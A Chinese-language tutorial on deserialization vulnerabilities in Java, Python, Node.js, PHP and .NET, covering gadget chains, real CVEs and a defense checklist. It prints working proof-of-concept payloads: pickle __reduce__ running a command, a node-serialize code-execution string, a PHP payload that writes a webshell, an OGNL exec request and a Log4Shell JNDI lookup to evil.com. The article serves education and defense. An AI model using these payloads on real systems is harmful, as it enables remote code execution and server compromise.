反序列化漏洞:Java / Python / Node / PHP 全栈视角 ​

讲反序列化漏洞最大的误区是「我只反序列化我自己生成的数据,所以安全」——这种自信是这类漏洞十几年杀不死的根源。反序列化和 SQL 注入、XSS 不一样:那两个的「数据」就是字符串,看得见摸得着;反序列化处理的是"对象图",对象图里藏着"方法引用",攻击者根本不需要注入"代码字符串",他直接构造一段合法的字节流,让你的运行时在"恢复对象"的过程中调用一串方法,这串方法走到最后就是 Runtime.exec("calc")。一旦你把不可信数据喂给 ObjectInputStream / pickle.loads / unserialize,这不是"可能有漏洞",是"几乎一定 RCE"——区别只在攻击者有没有现成的 gadget chain 可用。

一句话先记住:反序列化漏洞 = 字节流不只是"数据",它是"方法调用序列"——序列化协议为了恢复对象状态,会自动调用构造器、setter、readObject、__reduce__、__wakeup 等"钩子方法"。只要你能控制字节流,你就能控制运行时该调谁、传什么参数——剩下的工作只是在程序的 classpath 里找一串方法,首尾相接,把最后一个出口接到 Runtime.exec / eval / os.system。正确的防御只有一条:不反序列化不可信数据,用 JSON / Protobuf 这种"纯数据"格式。所有"我加个类白名单 / 我改用 XML / 我升级一下 Commons Collections" 都是补丁,补不完。

一、反序列化为什么危险 ​

1.1 序列化 vs 反序列化:不对称的危险 ​

序列化(把对象写成字节流)是安全的——你的对象变成字节,顶多泄露内部字段。

反序列化是致命的——外部的字节变成你进程里活的对象。这里有三个被低估的事实:

事实 1:反序列化会"自动调用方法"
        构造器、setter、readObject、__init__、__wakeup ... 全都会跑
        这些方法在你的 classpath 里,不是攻击者写的

事实 2:反序列化的对象类型由"字节流"决定
        而不是由你的代码决定
        attacker.send(bytes) → bytes 里写着 "类型是 X"
        你以为是 User,实际反出来一个 ProcessBuilder

事实 3:对象图可以嵌套到任意深度
        一个对象的字段可以是另一个对象
        反序列化时是"递归"展开的
        攻击者可以编织一棵"调用树"

1.2 与「代码注入」的本质区别 ​

很多人把反序列化漏洞类比成 SQL 注入,这个类比只对了一半:

维度SQL 注入 / XSS反序列化
注入的载体字符串拼到查询 / HTML字节流喂给反序列化器
触发方式解析器执行字符串运行时恢复对象 + 调钩子方法
攻击者写代码吗写(' OR 1=1、<script>)不写,只编排已有方法的调用顺序
防御方法参数化 / 转义不反序列化不可信数据
升级补丁能修吗能(改框架默认行为)不能,只要还在反序列化就还有 gadget

最关键的差异在第三行:SQL 注入,攻击者要写 SQL;XSS,攻击者要写 JS;反序列化,攻击者一行代码都不写——他只是在你 JVM 的 classpath 里(Spring、Hibernate、Commons Collections、Jackson、各种 JDBC 驱动……)找几个已经存在的、签了名的、看起来人畜无害的方法,把它们串起来。这就是为什么"我把危险库升级了"防不住——下一个 gadget 在另一个库里。

1.3 历史背景:为什么以前没人在意 ​

1997  Java 1.1 引入 ObjectInputStream
2006  PHP 引入 unserialize
2009  Python pickle 已经在用,但只在内部
        以上长达十几年没人当回事
2015  FoxGlove Security 公开 ysoserial
        一夜之间打穿了 WebLogic / WebSphere / JBoss / Jenkins
2017  Equifax 因 Apache Struts 反序列化漏洞泄露 1.4 亿人数据
2021  Log4Shell(JNDI 注入,本质类似:让运行时去 "lookup 类")

2015 年之前,Java 反序列化漏洞被认为是"理论问题"——你需要找到一串首尾相接的方法链,工作量太大。ysoserial 公布之后,常见库的 gadget chain 直接做成了工具,触发门槛从"研究员级"降到"脚本小子级"。从那以后,凡是接受外部字节流并 readObject 的服务,默认就是 RCE。

二、各语言反序列化危险点对比 ​

语言主要 API触发钩子武器化难度典型 gadget 来源
JavaObjectInputStream.readObjectreadObject / readResolve / 构造器 / setter中(需要 classpath 有可用 gadget)Commons Collections / BeanUtils / Spring AOP
Pythonpickle.loads__reduce__ / __setstate__极低(__reduce__ 直接返回可调用对象)任何 Python 进程
Node.jsnode-serialize.unserializeIIFE(立即执行函数)极低(直接嵌入函数体)不需要 gadget,直接写 JS

一条规律:所有"能恢复任意类型对象"的反序列化都是危险的——区别只在"找 gadget 的工作量"。JSON / Protobuf / MessagePack 之所以安全,是因为它们只能反序列化成"基础数据类型(map / list / string / number)",不带类型信息,不调钩子方法。

三、Java:ObjectInputStream 与 ysoserial ​

3.1 漏洞机制 ​

Java 的二进制序列化是「类型自包含」的——字节流里写着 类的全限定名 + 字段值。readObject 时:

1. 从流里读类名 → ClassLoader 加载这个类
2. 反射调用无参构造器(或绕过构造器,看实现)
3. 逐字段反序列化(嵌套时递归)
4. 如果这个类自定义了 readObject 方法,调它
5. 如果实现了 readResolve,用返回值替换

关键在第 4 步——readObject 是开发者自己写的代码,JDK 不知道也不在乎里面干了什么。Commons Collections 的 TransformerMap 的 readObject 里,有一段「把 key 通过 Transformer 链转换一下」的逻辑——这个 Transformer 链是可以由字节流控制的。

java
// 漏洞代码(典型反模式)
ServerSocket server = new ServerSocket(8080);
Socket client = server.accept();
ObjectInputStream ois = new ObjectInputStream(client.getInputStream());
Object obj = ois.readObject();  // 致命:对方控制字节,这里就是 RCE

3.2 gadget chain 的概念(不给完整链) ​

Map.get(key)
    → Transformer.transform(key)              // Commons Collections
    → ChainedTransformer.transform
    → InvokerTransformer.transform            // 反射调任意方法
    → Runtime.getRuntime().exec("calc")

串起来的每一个方法本身都是合法的、有用途的——InvokerTransformer 设计出来就是为了反射调方法,它没有任何"漏洞"。漏洞在于这串方法能被 readObject 自动触发。

这就是为什么 gadget chain 不是漏洞,是"工具"——你修不掉 InvokerTransformer,因为它有正经用途;你修不掉 Map.readObject 调 transform,因为这是它的语义。唯一能修的是"不要 readObject 不可信数据"。

3.3 JDK 自带的"补丁":JEP 290 ​

Java 9 引入 ObjectInputFilter(JEP 290),可以在反序列化之前过滤类:

java
ObjectInputStream ois = new ObjectInputStream(in);
ois.setObjectInputFilter(info -> {
    Class<?> clazz = info.serialClass();
    if (clazz != null && ALLOWED.contains(clazz.getName())) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED;
});

问题:这只是"白名单",不是"安全设计"。你的白名单里只要有一个类自己有可达的 gadget(比如某个支持反射调用的类),就还是 RCE。JEP 290 是缓解,不是根治。

3.4 现代 Java 的态度 ​

JEP 154 (Java 17)  serialization is "burden"
JEP 415 (Java 17)  filter factory,缩小默认信任面
未来              "Java 序列化将被弃用",rationale 写得很清楚:
                  "原始 Java 序列化是 Java 平台 1/3 安全漏洞的根源"

Oracle 自己都准备砍掉这套机制。结论:Java 项目里只要看到 ObjectInputStream,默认就要审计——除非确认字节流不可控,否则就是高危。

四、Python:pickle 的 __reduce__ ​

Python 的 pickle 比 Java 还危险——它甚至不需要 gadget,反序列化的语义就直接支持"调用任意 callable"。

4.1 最小 PoC ​

python
import pickle, os

class Evil:
    def __reduce__(self):
        # pickle.loads 时,会执行 os.system("id")
        return (os.system, ("id",))

payload = pickle.dumps(Evil())
# 把 payload 给受害者
pickle.loads(payload)   # → 直接执行 id 命令

机制:__reduce__ 是 pickle 协议的「序列化协议钩子」——它告诉 pickle「这个对象怎么重建」,返回一个 (callable, args) 元组。反序列化时,pickle 就 callable(*args)——这就是设计本身。

4.2 为什么 Python 官方不修 ​

pickle 的文档第一句话:

Warning: The pickle module is not secure. Only unpickle data you trust.

Python 的态度是"这是文档明确说的'危险 API',不是漏洞"——你拿它处理不可信数据,是你的错。这种「文档免责」在工业界经常被忽略,因为 pickle 用起来太方便了——pickle.dumps(obj) / pickle.loads(bytes),任意对象都能存,redis 缓存里塞一个 numpy 数组、机器学习模型存盘、Celery 任务队列、PyTorch checkpoint……全都用 pickle。

真实场景的危险点:

  • ML 模型分享(torch.load("model.pth") 默认用 pickle,下载别人的预训练模型 = 给他 RCE)
  • Celery / RQ 用 pickle 序列化任务(broker 被攻破 = worker 全沦陷)
  • Redis / Memcached 缓存对象(缓存被污染 = RCE)

4.3 替代方案 ​

pickle           完全不能反序列化不可信数据
shelve           底层是 pickle,同样危险
json             安全(只反基础类型)
msgpack          安全(只反基础类型)
protobuf         安全(schema 严格)
torch.load(weights_only=True)   PyTorch 2.0+ 的安全模式,只读张量
safetensors      Hugging Face 推的"只能存张量"的格式

PyTorch 在 2024 年默认改了 torch.load 的行为,这就是为什么 ML 安全圈这两年突然紧张起来。

五、Node.js:node-serialize 与 Function 构造器 ​

5.1 漏洞机制 ​

Node.js 标准库没有提供二进制序列化——JS 默认序列化是 JSON.stringify,这是安全的。问题出在第三方库 node-serialize,它支持"序列化函数"——这个特性听起来很美好,实际上就是 RCE。

js
const serialize = require('node-serialize');

// 攻击 payload:_$$ND_FUNC$$_ 前缀表示 "这是一个函数"
// IIFE 让 unserialize 立即执行
const payload = '{"rce":"_$$ND_FUNC$$_function(){' +
                'require(\'child_process\').exec(\'id\', function(e,s){console.log(s)});' +
                '}()"}';

serialize.unserialize(payload);   // → 执行 id

机制:node-serialize 看到 _$$ND_FUNC$$_ 前缀,就把后面的字符串直接喂给 Function 构造器(等价于 eval)。函数定义末尾的 () 让它立即执行——这甚至不是 gadget chain,直接就是 eval。

5.2 CVE-2017-5941 ​

这个 CVE 在 2017 年公开,node-serialize 至今没修——因为它的"特性"就是危险本身,修了就不能"序列化函数"了。库的作者把 README 改成"don't use untrusted input",这就是文档免责。

5.3 Node.js 的其他高危反序列化点 ​

funcster              同类问题
serialize-javascript  仅序列化端"安全",反序列化端如果用 eval 还是死
vm.runInNewContext    "沙箱"不是沙箱,逃逸技巧多到写不完
require()             给 require 传不可信路径 = RCE(prototype pollution 也能利用)

Node.js 生态的反序列化攻击面比表面上多——只要你的逻辑里有"把对方传过来的字符串当代码跑"的环节(eval、Function、vm),本质都是反序列化攻击的近亲。

六、PHP:unserialize + magic methods(POP 链) ​

PHP 的反序列化漏洞和 Java 最像——都依赖应用代码里有"自动被调用的方法",在 PHP 里这些叫 magic methods。

6.1 PHP 的 magic methods ​

__construct    构造时
__destruct     对象销毁时(脚本结束 / GC)        ← 反序列化漏洞最常用
__wakeup       unserialize 之后立即调用          ← 最常用
__toString     对象被当成字符串时(echo / 拼接)   ← 次常用
__call         调用不存在的方法时                ← 次常用
__get / __set  访问不存在的属性时

反序列化漏洞利用流程:

  1. 找到一个有 __wakeup / __destruct 的类(框架里到处都是)
  2. 控制它的字段值
  3. __wakeup / __destruct 里会用到这些字段
  4. 让字段值流到一个危险的 sink(eval、include、system、unlink)

这种"先调钩子、再让钩子里的代码经过几个跳板到达 sink"的链,在 PHP 圈叫 POP 链(Property-Oriented Programming)——和 ROP(Return-Oriented Programming)致敬。

6.2 最小 PoC(纯演示) ​

php
<?php
class Logger {
    public $file;
    public $content;
    function __destruct() {
        file_put_contents($this->file, $this->content);  // 危险 sink
    }
}

// 攻击者构造的 payload(可以从外部传入)
$payload = 'O:6:"Logger":2:{s:4:"file";s:9:"shell.php";'
         . 's:7:"content";s:20:"<?php system($_GET[0]);";}';

unserialize($payload);
// 脚本结束时 __destruct 触发 → 写入 webshell

关键点:Logger 类没有任何漏洞——它就是个正经的日志类。漏洞在于 unserialize 让攻击者控制了 $file 和 $content 两个字段。PHP 框架的"工具类"密度极高,Laravel / Symfony / Yii 里随便挑都能找到能串起来的类。

6.3 phar 反序列化:看似没 unserialize 也能中招 ​

PHP 的 phar 协议有一个反人类设计——访问 phar://xxx.phar 时,会自动反序列化里面的元数据:

php
// 这段代码看起来"没有 unserialize",其实有
file_exists("phar://uploaded.phar");
file_get_contents("phar://uploaded.phar");
getimagesize("phar://uploaded.phar");   // 上传图片绕过类型检查的经典

只要攻击者能上传一个 phar 文件(伪装成图片),并触发任何文件函数访问 phar:// 协议——POP 链就触发了。PHP 8.0 关闭了部分场景,但工程里有大量代码还在 PHP 7。

七、.NET:BinaryFormatter 与 JSON.NET 的 TypeNameHandling ​

7.1 BinaryFormatter:被微软自己标记为"危险" ​

csharp
// 危险代码(2020 年后微软已弃用)
var fmt = new BinaryFormatter();
var obj = fmt.Deserialize(stream);

微软在 .NET 5 的文档里直接写:

BinaryFormatter is insecure and can't be made secure. This guidance applies to all versions of .NET.

和 Java 一样的故事:gadget chain 在 System.Workflow / ObjectDataProvider 这些"工具类"里。微软的态度比 Oracle 还激进——.NET 7 直接把 BinaryFormatter.Deserialize 默认抛异常,你得显式开 opt-in 开关。

7.2 JSON.NET 的 TypeNameHandling ​

Newtonsoft.Json(.NET 最流行的 JSON 库)有一个反人类配置:

csharp
// 危险配置
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All   // 让 JSON 带类型信息
};
var obj = JsonConvert.DeserializeObject(json, settings);

加了这个之后,JSON 长这样:

json
{
  "$type": "System.Diagnostics.Process, System",
  ...
}

$type 直接告诉反序列化器"造一个这个类的实例"——本质上就是把 JSON 也变成了"类型自包含"的格式,和 BinaryFormatter 一样危险。永远不要开 TypeNameHandling.All 处理不可信数据——默认 None 是安全的。

八、真实案例:看看反序列化能打多大 ​

8.1 Apache Commons Collections(2015) ​

FoxGlove Security 公开 ysoserial,内置的 CommonsCollections1-7 gadget chain 打穿了:

WebLogic        Oracle 中间件,几乎所有银行 / 电信内网都有
WebSphere       IBM 中间件
JBoss           Red Hat 中间件
Jenkins         CI 服务器,通常有 sudo / 部署密钥
OpenNMS         网络监控

这些应用没有一个用了 Commons Collections 做"反序列化"——它们只是把 CC 放在 classpath 里当工具库。攻击者只要找到任意一个接受序列化字节流的端点(JMX、RMI、T3 协议、HTTP 自定义协议)就能 RCE。

8.2 WebLogic T3 / IIOP(CVE-2015-4852 起,延续至今) ​

WebLogic 的 T3 协议默认监听,接受序列化对象。Oracle 从 2015 年起打了 N 个补丁,每次补丁都在白名单里漏了一个类,然后被绕过:

CVE-2015-4852     初版,直接 readObject
CVE-2017-3248     第一次绕过(JRMP)
CVE-2018-2628     第二次绕过(StreamMessageImpl)
CVE-2019-2725     第三次绕过(wls9-async,改用 XML 序列化也中招)
CVE-2020-2883     第四次绕过(coherence)
CVE-2020-14882    ...

这是"白名单防御"的活教材——只要还在反序列化,白名单永远漏一个。

8.3 Confluence OGNL 注入(CVE-2022-26134) ​

OGNL 是一种"表达式语言",本质也是反序列化(把字符串反序列化成对象图 + 调用)。Confluence 把 URL 路径里的一部分当成 OGNL 表达式执行:

GET /${Runtime.getRuntime().exec("id")}/x  HTTP/1.1

这种"表达式语言"漏洞和反序列化是同一棵树——Struts2(OGNL)、Spring(SpEL)、Velocity、FreeMarker、Thymeleaf、JEXL 全都中过类似的招。只要你把用户输入喂给一个"能调用方法的解析器",本质都是反序列化漏洞。

8.4 Log4Shell(CVE-2021-44228):变体 ​

Log4j2 的 JNDI lookup 也是同一类问题:

${jndi:ldap://evil.com/x}

机制:Log4j 把 ${...} 当成查找指令 → 通过 JNDI 去 LDAP / RMI 服务器拿对象 → 拿回来的对象会被反序列化 / 加载类 / 调用方法。攻击面比传统 readObject 更广,因为日志可以走任何用户输入路径(User-Agent、邮件标题、聊天消息……)。

九、防御:工程化清单 ​

9.1 黄金法则 ​

1. 永远不反序列化不可信数据
2. 用 JSON / Protobuf / MessagePack 等"无类型"格式
3. 如果非要反序列化,做类型白名单 + 完整性签名
4. 关闭所有"自动反序列化"的入口(JMX / RMI / T3 / phar)
5. 监控 readObject / pickle.loads / unserialize 的所有调用点

9.2 各语言具体落地 ​

语言必须禁用推荐替代兜底措施
JavaObjectInputStream 处理外部数据 / fastjson 1.x autoType / Jackson enableDefaultTypingJackson disable(DEFAULT_TYPING) + DTOJEP 290 过滤器,关闭 T3 / RMI / JMX 外网

9.3 实在要反序列化:HMAC 签名 + 类白名单(Python 例) ​

python
import pickle, io, hmac, hashlib

class SafeUnpickler(pickle.Unpickler):
    ALLOWED = {("builtins", "dict"), ("builtins", "list"), ("builtins", "str")}
    def find_class(self, module, name):
        if (module, name) in self.ALLOWED:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")

def verify_and_load(blob, secret):
    sig, data = blob[:32], blob[32:]
    if not hmac.compare_digest(sig,
            hmac.new(secret, data, hashlib.sha256).digest()):
        raise ValueError("bad signature")
    return SafeUnpickler(io.BytesIO(data)).load()

这是"缓解",不是"根治"——SECRET 泄露(代码、环境变量、SSRF 拿到)或白名单里有可达危险方法,还是死。只在没有任何替代方案时使用。

十、纵深防御与监控 ​

SDL / 代码评审 checklist(SAST 工具能扫,SonarQube / Semgrep / CodeQL):

✗ ObjectInputStream / readObject(Java)
✗ pickle.loads / pickle.load / yaml.load 非 SafeLoader(Python)
✗ unserialize / phar:// 路径来自用户(PHP)
✗ Marshal.load(Ruby)
✗ BinaryFormatter / SoapFormatter / NetDataContractSerializer(.NET)
✗ node-serialize / funcster(Node)
▲ fastjson 1.x autoType / Jackson enableDefaultTyping / XStream 无 SecurityFramework
▲ Newtonsoft.Json TypeNameHandling = All / Auto / Objects

RASP / 运行时监控:对 ObjectInputStream.readObject / pickle.loads 加 hook,正常业务代码"不应该"反序列化用户数据——任何调用栈打到反序列化 API 就告警。Contrast Security / OpenRASP 等商业方案有现成规则。

WAF 的局限:能检测序列化字节流的 magic header(ac ed 00 05 / O:N:"...")和常见 gadget 类名,但二次编码(base64 / gzip)、JSON 里的类型自包含字段、二进制协议(T3 / RMI / 自研 RPC)都拦不住。WAF 是辅助,不是主防御。

网络层:关闭祖传协议——JMX(1099)、RMI、WebLogic T3(7001)、Hessian / Burlap、IIOP 默认不许出公网,内网白名单访问。端口不可达,绝大多数 ysoserial 类利用就到不了你的进程——这是性价比最高的一道。

十一、踩坑清单(总结) ​

  1. 以为"我只反序列化自己的对象"就安全——只要反序列化器接受字节流,字节流就可控
  2. 以为"我加了类白名单"就解决了——WebLogic 用十年证明白名单永远漏一个
  3. 以为 JSON 就一定安全——JSON.NET TypeNameHandling.All / fastjson 1.x autoType 一样死
  4. 以为 PHP __wakeup 修了就安全——__destruct / __toString / phar 还在
  5. 以为"我升级了 Commons Collections"就好了——下一个 gadget 在 Spring / Hibernate
  6. 以为只有 readObject 才叫反序列化——OGNL / SpEL / JNDI / 模板引擎都是同一类
  7. 以为模型文件是"数据"——torch.load / pickle.load 默认是代码执行
  8. 以为 phar 漏洞已经修了——PHP 7 还在大量使用,phar:// 流包装器默认开
  9. 以为 WAF 能拦住——魔改协议 / 二次编码 / 二进制协议绕过太简单
  10. 以为只是"OWASP A8"打个补丁就过——这是「设计层缺陷」,只能避开,不能修
